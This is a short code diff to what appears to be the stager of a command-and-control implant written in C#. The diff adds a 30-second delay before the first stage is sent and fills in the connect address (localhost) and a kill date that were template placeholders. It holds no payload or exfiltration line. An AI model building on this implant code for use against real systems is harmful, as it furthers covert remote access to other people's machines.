@@ -66,6 +66,8 @@ namespace Stager
             CommModule = new HTTPCommModule(AgentID, ConnectAddress, ConnectPort);
             CommModule.Start();
 
+            System.Threading.Thread.Sleep(30000);
+
             SendStage0();
 
             while (!Staged)
@@ -181,7 +183,7 @@ namespace Stager
 
         static string ConnectAddress
         {
-            get { return "<<ConnectAddress>>"; }
+            get { return "127.0.0.1"; }
         }
 
         static int ConnectPort
@@ -201,7 +203,7 @@ namespace Stager
 
         static DateTime KillDate
         {
-            get { return DateTime.Parse("<<KillDate>>"); }
+            get { return DateTime.Parse("01/01/2030 00:00:01"); }
         }
     }
 }
